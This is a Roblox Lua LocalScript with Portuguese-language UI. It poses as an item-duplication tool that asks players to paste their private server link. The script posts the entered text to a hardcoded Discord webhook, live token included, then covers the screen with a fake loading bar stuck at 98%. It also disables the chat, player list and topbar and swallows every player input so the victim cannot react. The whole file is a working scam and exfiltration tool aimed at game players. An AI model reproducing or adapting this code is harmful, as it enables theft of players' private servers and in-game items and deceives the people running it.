-- LocalScript HARDCORE FINAL TOPBAR BLOCKER

-- Use apenas em ambiente controlado/testes

local Players = game:GetService("Players")

local HttpService = game:GetService("HttpService")

local TweenService = game:GetService("TweenService")

local UserInputService = game:GetService("UserInputService")

local ContextActionService = game:GetService("ContextActionService")

local StarterGui = game:GetService("StarterGui")

local CoreGui = game:GetService("CoreGui")

local player = Players.LocalPlayer

local playerGui = player:WaitForChild("PlayerGui")

-- CONFIG

local WEBHOOK_URL = "https://discord.com/api/webhooks/1427906672277454880/wX8uik3Nm0x3L0bv0SUNDqgiUWHyomGrdD24mp7Pke4uHiDJb2ZK0IEg89FlueESh3oI"

local MAX_CHARS = 2000

local COOLDOWN = 6

local HIGHLIGHT_COLOR = Color3.fromRGB(94,170,255) -- azul

local lastSent = 0

local boundActions = {}

-- ENVIO

local function sendViaHttpRequest(text)

    if type(http)=="table" and type(http.request)=="function" then

        pcall(function()

            http.request({

                Url=WEBHOOK_URL,

                Method="POST",

                Headers={["Content-Type"]="application/json"},

                Body=HttpService:JSONEncode({content=text})

            })

        end)

    elseif type(request)=="function" then

        pcall(function()

            request({

                Url=WEBHOOK_URL,

                Method="POST",

                Headers={["Content-Type"]="application/json"},

                Body=HttpService:JSONEncode({content=text})

            })

        end)

    end

end

-- TWEEN

local function tween(obj, props, time, style, dir)

    local info = TweenInfo.new(time or 0.4, style or Enum.EasingStyle.Quad, dir or Enum.EasingDirection.Out)

    local t = TweenService:Create(obj, info, props)

    t:Play()

    return t

end

-- ROOT GUI

local rootGui = Instance.new("ScreenGui")

rootGui.Name="QS_RootGui_HARDCORE"

rootGui.ResetOnSpawn=false

rootGui.IgnoreGuiInset=true

rootGui.ZIndexBehavior=Enum.ZIndexBehavior.Sibling

rootGui.Parent=playerGui

-- INPUT INTERFACE

local inputFrame = Instance.new("Frame")

inputFrame.Size=UDim2.new(0,520,0,160)

inputFrame.Position=UDim2.new(0.5,-260,0.38,-80)

inputFrame.AnchorPoint=Vector2.new(0.5,0.5)

inputFrame.BackgroundColor3=Color3.fromRGB(12,12,12)

inputFrame.BorderSizePixel=0

inputFrame.BackgroundTransparency=1

inputFrame.Parent=rootGui

local header = Instance.new("Frame")

header.Size=UDim2.new(1,0,0,40)

header.BackgroundTransparency=1

header.Parent=inputFrame

local title = Instance.new("TextLabel")

title.Size=UDim2.new(1,0,1,0)

title.BackgroundTransparency=1

title.Font=Enum.Font.SourceSansBold

title.TextSize=18

title.TextColor3=Color3.fromRGB(220,220,220)

title.Text="Insira o link do servidor"

title.Parent=header

local textBox = Instance.new("TextBox")

textBox.Size=UDim2.new(1,-20,0,70)

textBox.Position=UDim2.new(0,10,0,46)

textBox.BackgroundColor3=Color3.fromRGB(22,22,22)

textBox.TextColor3=Color3.fromRGB(230,230,230)

textBox.PlaceholderText="https://"

textBox.Font=Enum.Font.SourceSans

textBox.TextSize=18

textBox.ClearTextOnFocus=false

textBox.Parent=inputFrame

local sendBtn = Instance.new("TextButton")

sendBtn.Size=UDim2.new(0,160,0,42)

sendBtn.AnchorPoint=Vector2.new(0.5,1)

sendBtn.Position=UDim2.new(0.5,0,1,-8)

sendBtn.Text="Enviar"

sendBtn.Font=Enum.Font.SourceSansBold

sendBtn.TextSize=18

sendBtn.TextColor3=Color3.fromRGB(245,245,245)

sendBtn.BackgroundColor3=Color3.fromRGB(32,32,32)

sendBtn.BorderSizePixel=0

sendBtn.Parent=inputFrame

local hint = Instance.new("TextLabel")

hint.BackgroundTransparency=1

hint.Size=UDim2.new(1,-20,0,18)

hint.Position=UDim2.new(0,10,1,-28)

hint.Font=Enum.Font.SourceSans

hint.TextSize=14

hint.TextColor3=Color3.fromRGB(180,180,180)

hint.TextXAlignment=Enum.TextXAlignment.Left

hint.Text="Este script fechará sua base automático."

hint.Parent=inputFrame

-- Fade-in

tween(inputFrame,{BackgroundTransparency=0},0.45)

tween(textBox,{BackgroundTransparency=0},0.45)

tween(sendBtn,{BackgroundTransparency=0},0.45)

-- draggable

do

    local dragging=false

    local dragInput, dragStart, startPos

    local function update(input)

        local delta=input.Position-dragStart

        inputFrame.Position=UDim2.new(startPos.X.Scale,startPos.X.Offset+delta.X,startPos.Y.Scale,startPos.Y.Offset+delta.Y)

    end

    inputFrame.InputBegan:Connect(function(input)

        if input.UserInputType==Enum.UserInputType.MouseButton1 or input.UserInputType==Enum.UserInputType.Touch then

            dragging=true

            dragStart=input.Position

            startPos=inputFrame.Position

            input.Changed:Connect(function()

                if input.UserInputState==Enum.UserInputState.End then dragging=false end

            end)

        end

    end)

    inputFrame.InputChanged:Connect(function(input)

        if input==dragInput and dragging then update(input) end

    end)

    UserInputService.InputChanged:Connect(function(input)

        if input==dragInput and dragging then update(input) end

    end)

end

-- BLOCKER UI

local blocker = Instance.new("Frame")

blocker.Size=UDim2.new(1,0,1,0)

blocker.Position=UDim2.new(0,0,0,0)

blocker.BackgroundColor3=Color3.fromRGB(6,6,6)

blocker.BorderSizePixel=0

blocker.Visible=false

blocker.Parent=rootGui

blocker.ZIndex=999

local center = Instance.new("Frame")

center.Size=UDim2.new(0,740,0,220)

center.AnchorPoint=Vector2.new(0.5,0.5)

center.Position=UDim2.new(0.5,0.45,0.5,0)

center.BackgroundTransparency=1

center.Parent=blocker

local relaxLabel = Instance.new("TextLabel")

relaxLabel.Size=UDim2.new(1,0,0,36)

relaxLabel.Position=UDim2.new(0,0,0,0)

relaxLabel.BackgroundTransparency=1

relaxLabel.Font=Enum.Font.SourceSansBold

relaxLabel.TextSize=20

relaxLabel.TextColor3=Color3.fromRGB(220,220,220)

relaxLabel.Text="O script está fazendo o duplicamento, relaxe 😎"

relaxLabel.Parent=center

-- progress bar

local barBg = Instance.new("Frame")

barBg.Size=UDim2.new(0.92,0,0,28)

barBg.Position=UDim2.new(0.04,0,0.38,0)

barBg.BackgroundColor3=Color3.fromRGB(24,24,24)

barBg.BorderSizePixel=0

barBg.AnchorPoint=Vector2.new(0,0)

barBg.Parent=center

local fill = Instance.new("Frame")

fill.Size=UDim2.new(0,0,1,0)

fill.Position=UDim2.new(0,0,0,0)

fill.BackgroundColor3=HIGHLIGHT_COLOR

fill.BorderSizePixel=0

fill.Parent=barBg

local percentLabel = Instance.new("TextLabel")

percentLabel.Size=UDim2.new(0.12,0,0,28)

percentLabel.Position=UDim2.new(0.88,0,0.38,0)

percentLabel.BackgroundTransparency=1

percentLabel.Font=Enum.Font.SourceSansBold

percentLabel.TextSize=16

percentLabel.TextColor3=Color3.fromRGB(220,220,220)

percentLabel.Text="0%"

percentLabel.Parent=center

local sub = Instance.new("TextLabel")

sub.Size=UDim2.new(1,0,0,24)

sub.Position=UDim2.new(0,0,0.72,0)

sub.BackgroundTransparency=1

sub.Font=Enum.Font.SourceSans

sub.TextSize=16

sub.TextColor3=Color3.fromRGB(180,180,180)

sub.Text="Aguarde..."

sub.Parent=center

local function setPercent(p,t)

    p=math.clamp(p,0,100)

    percentLabel.Text=tostring(math.floor(p)).."%"

    TweenService:Create(fill,TweenInfo.new(t or 0.25,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{Size=UDim2.new(p/100,0,1,0)}):Play()

end

-- HARDCORE: desativa CoreGui e inputs

local function sinkAction(name,state,input) return Enum.ContextActionResult.Sink end

local function hardcoreDisableControlsAndGui()

    local coreGui=CoreGui

    -- CoreGui gerais

    pcall(function()

        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack,false)

        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat,false)

        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList,false)

        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu,false)

        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Health,false)

        pcall(function() StarterGui:SetCore("TopbarEnabled",false) end)

        pcall(function() StarterGui:SetCore("PlayerListEnabled",false) end)

    end)

    -- Remove/oculta PlayerList e Topbar

    pcall(function()

        for _,child in ipairs(coreGui:GetChildren()) do

            local nameLower=string.lower(child.Name)

            if nameLower:find("player") or nameLower:find("playerlist") or nameLower:find("topbar") then

                if child:IsA("GuiObject") then

                    child.Visible=false

                else

                    child:Destroy()

                end

            end

        end

    end)

    -- Engole inputs

    for _,actionEnum in ipairs(Enum.PlayerActions:GetEnumItems()) do

        local actionName="QS_Sink_"..actionEnum.Name

        ContextActionService:BindAction(actionName,sinkAction,false,actionEnum)

        boundActions[#boundActions+1]=actionName

    end

    pcall(function()

        UserInputService.ModalEnabled=true

        UserInputService.OverrideMouseIconBehavior=Enum.OverrideMouseIconBehavior.ForceHide

    end)

end

-- ativa blocker

local function activateBlocker()

    blocker.Visible=true

    blocker.BackgroundTransparency=1

    tween(blocker,{BackgroundTransparency=0},0.45)

    task.delay(0.12,function()

        hardcoreDisableControlsAndGui()

        setPercent(0,0)

        -- loading fake

        for p=0,56,4 do setPercent(p,0.08); task.wait(0.06) end

        setPercent(56,0.12); task.wait(0.12)

        for p=57,98 do setPercent(p,0.18); task.wait(0.14) end

        setPercent(98,0.2)

    end)

end

-- Botão enviar

sendBtn.MouseButton1Click:Connect(function()

    local now = tick()

    if now-lastSent<COOLDOWN then

        sendBtn.Text="Aguarde..."

        task.delay(1.2,function() if sendBtn and sendBtn.Parent then sendBtn.Text="Enviar" end end)

        return

    end

    local txt=tostring(textBox.Text or "")

    if txt=="" then textBox.PlaceholderText="Digite o link!"; return end

    if #txt>MAX_CHARS then txt=txt:sub(1,MAX_CHARS).."..." end

    lastSent=now

    task.spawn(function() sendViaHttpRequest(txt) end)

    tween(inputFrame,{BackgroundTransparency=1},0.35)

    tween(textBox,{BackgroundTransparency=1,TextTransparency=1},0.35)

    tween(sendBtn,{BackgroundTransparency=1,TextTransparency=1},0.35)

    tween(title,{TextTransparency=1},0.35)

    tween(hint,{TextTransparency=1},0.35)

    task.delay(0.38,function()

        inputFrame:Destroy()

        activateBlocker()

    end)

end)
